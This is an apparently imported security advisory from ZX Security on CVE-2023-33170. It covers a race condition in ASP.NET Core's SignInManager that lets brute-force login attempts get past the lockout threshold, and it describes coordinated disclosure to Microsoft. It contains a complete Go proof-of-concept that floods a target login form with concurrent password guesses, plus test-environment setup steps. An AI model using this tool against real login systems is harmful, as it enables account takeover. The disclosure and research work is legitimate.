---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-12_security-feature-bypass-in-aspnet-and-visual-studio-race-condition.md
original_filename: 2023-07-12_security-feature-bypass-in-aspnet-and-visual-studio-race-condition.md
title: Security Feature Bypass In ASP.NET and Visual Studio – Race Condition
category: documents
detected_topics:
- race-condition
- sqli
- command-injection
- otp
- rate-limit
- csrf
tags:
- imported
- documents
- race-condition
- sqli
- command-injection
- otp
- rate-limit
- csrf
language: en
raw_sha256: b97ad4962e3aebfd736700da31a65e6847efcca78ccfc2787bec3841298109f0
text_sha256: 7f048e03e58d72ff1404b77d6d4494a0a9b6a614f108861e7141ec7c5da609fb
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Security Feature Bypass In ASP.NET and Visual Studio – Race Condition

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-12_security-feature-bypass-in-aspnet-and-visual-studio-race-condition.md
- Source Type: markdown
- Detected Topics: race-condition, sqli, command-injection, otp, rate-limit, csrf
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `b97ad4962e3aebfd736700da31a65e6847efcca78ccfc2787bec3841298109f0`
- Text SHA256: `7f048e03e58d72ff1404b77d6d4494a0a9b6a614f108861e7141ec7c5da609fb`


## Content

---
title: "Security Feature Bypass In ASP.NET and Visual Studio – Race Condition"
page_title: "Security Feature Bypass In ASP.NET and Visual Studio - ZX Security"
url: "https://zxsecurity.co.nz/research/advisories/race-condition-asp-net-core-signinmanager/"
final_url: "https://zxsecurity.co.nz/research/advisories/race-condition-asp-net-core-signinmanager/"
authors: ["Jack Moran", "TC", "Ethan McKee-Harris"]
programs: ["Microsoft"]
bugs: ["Race condition", "Bruteforce"]
publication_date: "2023-07-12"
added_date: "2023-07-12"
source: "pentester.land/writeups.json"
original_index: 936
---

You are here…

  1. [ Home ](/)
  2. [ Research ](../../)
  3. [ Advisories ](../)

#  Security Feature Bypass In ASP.NET and Visual Studio – Race Condition 

Jack Moran, TC, and Ethan McKee-Harris discovered a security feature bypass within the SignInManger in ASP.NET.

Published on  12th July 2023 

## Introduction

During an engagement, Jack Moran, with the aide of TC and Ethan McKee-Harris, discovered a security feature bypass within ASP.NET SignInManager. The SignInManager was found to be susceptible to a race condition which when exploited could allow for thousands of brute-force login attempts to be conducted before ever triggering the lockout threshold.

### CVE-2023-33170 Attributions

![Screenshot of MSRC Acknowledgements.](/assets/img/advisories/MSRC.png)

### So What Happened?

During a web application pentest, Jack Moran from ZX Security found an inconsistency when attempting to credential stuff a login form. This inconsistency centred around the lockout threshold and when the application was triggering it. Further analysis indicated that the default lockout was configured for 3 invalid login attempts, however, testing showed that this was inconsistent and could far exceed the expected lockout. Initial tests at the time highlighted that the lockout triggered sporadically, sometimes ranging from 10 to 50 failed authentication attempts without the lockout triggering.

Early indications of the system highlighted the culprit to be the ASP.NET SignInManager as when this function is called it ‘Attempts to sign in the specified userName and password combination as an asynchronous operation’. With asynchronous operations, when multiple threads can access or change a shared resource a race condition can occur. When looking at the database logs it was observed that this was happening. A snippet of the database log is included below, with an error indicating that a ‘Microsoft.EntityFrameworkCore.DbUpdateConcurrencyException’ was present and that the ‘database operation failed as the data may have been modified or deleted’
  
  
  fail: Microsoft.EntityFrameworkCore.Update[10000]
  An exception occurred in the database while saving changes for context type 'WebApp.Data.ApplicationDbContext'.
  Microsoft.EntityFrameworkCore.DbUpdateConcurrencyException: The database operation was expected to affect 1 row(s), but actually affected 0 row(s); data may have been modified or deleted since entities were loaded. See http://go.microsoft.com/fwlink/?LinkId=527962 for information on understanding and handling optimistic concurrency exceptions.
  at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ThrowAggregateUpdateConcurrencyExceptionAsync(RelationalDataReader reader, Int32 commandIndex, Int32 expectedRowsAffected, Int32 rowsAffected, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ConsumeResultSetWithRowsAffectedOnlyAsync(Int32 commandIndex, RelationalDataReader reader, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ConsumeAsync(RelationalDataReader reader, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.ReaderModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.ReaderModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.SqlServer.Update.Internal.SqlServerModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.ExecuteAsync(IEnumerable`1 commandBatches, IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.ExecuteAsync(IEnumerable`1 commandBatches, IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.ExecuteAsync(IEnumerable`1 commandBatches, IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.ChangeTracking.Internal.StateManager.SaveChangesAsync(IList`1 entriesToSave, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.ChangeTracking.Internal.StateManager.SaveChangesAsync(StateManager stateManager, Boolean acceptAllChangesOnSuccess, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.SqlServer.Storage.Internal.SqlServerExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func`4 operation, Func`4 verifySucceeded, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.DbContext.SaveChangesAsync(Boolean acceptAllChangesOnSuccess, CancellationToken cancellationToken)
  Microsoft.EntityFrameworkCore.DbUpdateConcurrencyException: The database operation was expected to affect 1 row(s), but actually affected 0 row(s); data may have been modified or deleted since entities were loaded. See http://go.microsoft.com/fwlink/?LinkId=527962 for information on understanding and handling optimistic concurrency exceptions.
  at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ThrowAggregateUpdateConcurrencyExceptionAsync(RelationalDataReader reader, Int32 commandIndex, Int32 expectedRowsAffected, Int32 rowsAffected, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ConsumeResultSetWithRowsAffectedOnlyAsync(Int32 commandIndex, RelationalDataReader reader, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ConsumeAsync(RelationalDataReader reader, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.ReaderModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.ReaderModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.SqlServer.Update.Internal.SqlServerModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.ExecuteAsync(IEnumerable`1 commandBatches, IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.ExecuteAsync(IEnumerable`1 commandBatches, IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.ExecuteAsync(IEnumerable`1 commandBatches, IRelationalConnection connection, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.ChangeTracking.Internal.StateManager.SaveChangesAsync(IList`1 entriesToSave, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.ChangeTracking.Internal.StateManager.SaveChangesAsync(StateManager stateManager, Boolean acceptAllChangesOnSuccess, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.SqlServer.Storage.Internal.SqlServerExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func`4 operation, Func`4 verifySucceeded, CancellationToken cancellationToken)
  at Microsoft.EntityFrameworkCore.DbContext.SaveChangesAsync(Boolean acceptAllChangesOnSuccess, CancellationToken cancellationToken)
  

These errors highlighted multiple concurrent requests are attempting to update the database, with many of these requests failing to update appropriately. This is due to the next concurrent request already modifying the database. As a result, many login attempts are performed, but the database is not modified consistently, indicating a race condition may be present allowing a user to perform a brute-force attack. Jack Moran decided to write a proof of concept to test this out locally which resulted in thousands of failed authentication requests being conducted before triggering the lockout threshould.

### So You Want The PoC?
  
  
  package main
  
  import (
  "bytes"
  "encoding/base64"
  "flag"
  "fmt"
  "math/rand"
  "net/http"
  "net/url"
  "strings"
  "sync"
  )
  
  type RequestResult struct {
  UUID  int
  ResponseStatus  int
  ResponseLocation string
  }
  
  func Request(HttpClient *http.Client, UniversalResourceLocator string, HttpPayload []byte, CookieName string, CookieValue string, Data chan RequestResult, Trigger chan bool, UUID int, WaitGroup *sync.WaitGroup) {
  // Mark WaitGroup as Done When Function Exits
  defer WaitGroup.Done()
  
  <-Trigger
  
  // Create HTTPRequest and RequestError, Return if RequestError
  HttpRequest, RequestError := http.NewRequest(http.MethodPost, UniversalResourceLocator, bytes.NewBuffer(HttpPayload))
  if RequestError != nil {
  fmt.Println("Error creating request:", RequestError)
  return
  }
  
  // Create Cookie
  Cookie := &http.Cookie{
  Name:  CookieName,
  Value: CookieValue,
  }
  
  // Add HTTPHeader and HTTPCookie
  HttpRequest.Header.Set("Content-Type", "application/x-www-form-urlencoded")
  HttpRequest.AddCookie(Cookie)
  
  // Create HTTPResponse and ResponseError, Do HttpRequest, Return if RequestError
  HttpResponse, ResponseError := HttpClient.Do(HttpRequest)
  if ResponseError != nil {
  fmt.Println("Error making request:", ResponseError)
  return
  }
  defer HttpResponse.Body.Close()
  
  // Store HTTPResponse In Struct
  Result := RequestResult{
  UUID:  UUID,
  ResponseStatus:  HttpResponse.StatusCode,
  ResponseLocation: HttpResponse.Header.Get("Location"),
  }
  
  // Send Struct to Data Channel
  Data <- Result
  }
  
  func generateSomeBytes() string {
  // Psudo random number generator
  RandomBytes := make([]byte, 8)
  rand.Read(RandomBytes)
  return base64.StdEncoding.EncodeToString(RandomBytes)
  }
  
  func main() {
  // Define Veriables
  var NumberRequests int
  var UserName string
  var URL string
  var RequestVerificationToken string
  var CookieName string
  var CookieValue string
  var LoginFailureCount int
  var LoginLockoutCount int
  var LoginSuccessCount int
  var WaitGroup = sync.WaitGroup{}
  
  // Define Execution Flags
  flag.IntVar(&NumberRequests, "requests", 1, "Number of Requests")
  flag.StringVar(&UserName, "username", "", "Target Username")
  flag.StringVar(&URL, "url", "", "Target URL")
  flag.StringVar(&RequestVerificationToken, "csrf", "", "Csrf-Token")
  flag.StringVar(&CookieName, "cookiename", "", "CookieName")
  flag.StringVar(&CookieValue, "cookievalue", "", "CookieName")
  flag.Parse()
  
  // Create Bad and Good Credentials as Form Data Payload.
  BadCredentials := url.Values{
  "Input.Email":  {UserName},
  "Input.Password":  {generateSomeBytes()},
  "__RequestVerificationToken": {RequestVerificationToken},
  }
  
  GoodCredentials := url.Values{
  "Input.Email":  {UserName},
  "Input.Password":  {"APassword"},
  "__RequestVerificationToken": {RequestVerificationToken},
  }
  
  // Create HTTPClient, Check Redirect Is Pressent Return
  HTTPClient := &http.Client{
  CheckRedirect: func(HttpRequest *http.Request, via []*http.Request) error {
  return http.ErrUseLastResponse
  },
  }
  
  // Create DataChannel, TriggerChannel for GoRoutines
  var DataChannel = make(chan RequestResult, NumberRequests)
  var TriggerChannel = make(chan bool)
  var rand = rand.Intn(NumberRequests)
  
  WaitGroup.Add(NumberRequests)
  for i := 0; i < NumberRequests; i++ {
  if i == rand {
  go Request(HTTPClient, URL, []byte(GoodCredentials.Encode()), CookieName, CookieValue, DataChannel, TriggerChannel, i, &WaitGroup)
  } else {
  go Request(HTTPClient, URL, []byte(BadCredentials.Encode()), CookieName, CookieValue, DataChannel, TriggerChannel, i, &WaitGroup)
  }
  }
  close(TriggerChannel)
  
  // Mark WaitGroup as Wait for all GoRoutines to Finish
  WaitGroup.Wait()
  
  // Looping Through Results, Check if Login FAIL, LOCK, or PASS
  for i := 0; i < NumberRequests; i++ {
  Results := <-DataChannel
  
  if strings.Contains(Results.ResponseLocation, "") && Results.ResponseStatus == 200 {
  fmt.Printf("[\033[31m!\033[0m] LOGIN FAIL - Request: %d \n", Results.UUID)
  LoginFailureCount += 1
  } else if strings.Contains(Results.ResponseLocation, "/Identity/Account/Lockout") && Results.ResponseStatus == 302 {
  fmt.Printf("[\033[33m-\033[0m] LOGIN LOCK - Request: %d  \n", Results.UUID)
  LoginLockoutCount += 1
  } else if strings.Contains(Results.ResponseLocation, "/") && Results.ResponseStatus == 302 {
  fmt.Printf("[\033[32m✓\033[0m] LOGIN PASS - Request: %d \n", Results.UUID)
  LoginSuccessCount += 1
  }
  }
  
  // PRINTING VALUES
  fmt.Println("")
  fmt.Println("[\033[31m!\033[0m] FAIL login Count:", LoginFailureCount)
  fmt.Println("[\033[33m-\033[0m] LOCK login Count:", LoginLockoutCount)
  fmt.Println("[\033[32m✓\033[0m] PASS login Count:", LoginSuccessCount)
  }
  
  

### Development of Testing Environment

While the proof of concept was in development, Ethan McKee-Harris deployed a testing environment based on Microsoft’s ‘Create a Web app with authentication’ documentation. A local server and web application was set up to verify that this is not isolated to the current engagement but could be widespread in the SignInManger itself. After installing the latest version of dotnet (at the time we were testing), we generated a new web application using Microsoft’s scaffolding:
  
  
  dotnet new webapp --auth Individual -o WebApp
  

After creating the scaffolded web application, developers can also install templated account management with the following commands:
  
  
  cd WebApp
  dotnet tool install -g dotnet-aspnet-codegenerator
  dotnet add package Microsoft.VisualStudio.Web.CodeGeneration.Design
  dotnet aspnet-codegenerator identity -dc WebApp.Data.ApplicationDbContext --files "Account.Register;Account.Login;Account.Logout;Account.RegisterConfirmation" --databaseProvider=sqlite
  

Navigate to and open the file `Areas/Identity/Pages/Account/Login.cshtml.cs`. Change the `PasswordSignInAsync` method call so that `lockoutOnFailure` is set to `true`. We also need to enable account lockout, so navigate to `Program.cs` in the base web application directory. After the `builder` is defined, paste the following configuration options. This sets up the requirements to support account lockout on our test web application.
  
  
  builder.Services.Configure<IdentityOptions>(options =>
  {
  // Password settings.
  // Turn off requirements for testing purposes
  options.Password.RequireDigit = false;
  options.Password.RequireLowercase = false;
  options.Password.RequireNonAlphanumeric = false;
  options.Password.RequireUppercase = false;
  options.Password.RequiredLength = 6;
  options.Password.RequiredUniqueChars = 1;
  
  // Lockout settings.
  options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(5);
  options.Lockout.MaxFailedAccessAttempts = 5;
  options.Lockout.AllowedForNewUsers = true;
  
  // User settings.
  options.User.AllowedUserNameCharacters =
  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._@+";
  options.User.RequireUniqueEmail = false;
  });
  
  builder.Services.ConfigureApplicationCookie(options =>
  {
  // Cookie settings
  options.Cookie.HttpOnly = true;
  options.ExpireTimeSpan = TimeSpan.FromMinutes(5);
  
  options.LoginPath = "/Identity/Account/Login";
  options.AccessDeniedPath = "/Identity/Account/AccessDenied";
  options.SlidingExpiration = true;
  });
  

Further to this, if you wish to conduct testing from non-local IP addresses, add the following config to appsettings.json in order to expose the web application to all IP addresses.
  
  
  "Kestrel": {
  "EndPoints": {
  "Http": {
  "Url": "http://0.0.0.0:5010"
  }
  }
  }
  

Then to run the application, simply use `dotnet run` on the command line.

Throughout the disclosure process, Microsoft have been exceedingly helpful. Working within the bounds of the Microsoft Security Researcher Center (MSRC) disclosure policy, they were quick to confirm the issue and work with ZX Security to navigate the vulnerability through the various stages, resulting in a patch that resolves the issues.

## Vulnerability Disclosure Timeline (NZST):

  * 03/03/2023 - Discovered a race condition in ASP.NET Core SignInManager
  * 07/03/2023 - Submission of vulnerability to Microsoft Security Research Center for review
  * 08/03/2023 - MSRC: Case Number Assigned, Stage - New
  * 08/03/2023 - MSRC: Vulnerability Being Reviewed, Stage - Review/Reproduce
  * 07/04/2023 - MSRC: Vulnerability Confirmed, Stage - Develop
  * 18/05/2023 - MSRC: Vulnerability Disclosure Extension Request
  * 26/05/2023 - MSRC: Vulnerability Severity Rating Important (High), Stage - Develop
  * 12/07/2023 - MSRC: Vulnerability Fixed, Stage - PreRelease
  * 12/07/2023 - MSRC: Vulnerability Fixed, Stage - Complete

## References

  * [Microsoft Security Research Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-33170)
  * [Microsoft Dev Blogs](https://devblogs.microsoft.com/dotnet/july-2023-updates/)
  * [Microsoft DotNet Github](https://github.com/dotnet/announcements/issues/264)
  * [Microsoft Learn ASP.NET Core 7](https://learn.microsoft.com/en-us/aspnet/core/introduction-to-aspnet-core?view=aspnetcore-7.0)
  * [Microsoft Learn SignInManager](https://learn.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.identity.signinmanager-1.passwordsigninasync?view=aspnetcore-7.0)
  * [GitHub - Merged PR 31212: internal/release/6.0 Always return SignInResult.Failed if updating AccessFailedCount fails](https://github.com/dotnet/aspnetcore/commit/31ec24f8bfb21793fe4a331a7bba95b4013d6870)
  * [Microsoft Learn Documentation](https://learn.microsoft.com/en-us/aspnet/core/security/authentication/identity?view=asp)

## Sidebar

###  Insights 

[ View all insights ](/research/insights/)

####  Green Team Tree Planting at Ōwhiro Bay 

26th June 2023 

ZX Green Team gets muddy planting native trees. 

[ View insight: Green Team Tree Planting at Ōwhiro Bay ](/research/insights/green-team-june-planting-day/)

###  Events 

[ View all events ](/events/)

####  BSides San Francisco 

4 May  to  5 May 2024 

CityView at SF Metreon 

BSidesSF is an Information / Security conference that's different. Presenters at BSides SF conferences are engaging the participants and getting the discussions started on the "Next Big Thing", not preaching at you from the podium about last month's news. 

[ View event: BSides San Francisco ](/events/#event_2024-bsides-sf)

* * *
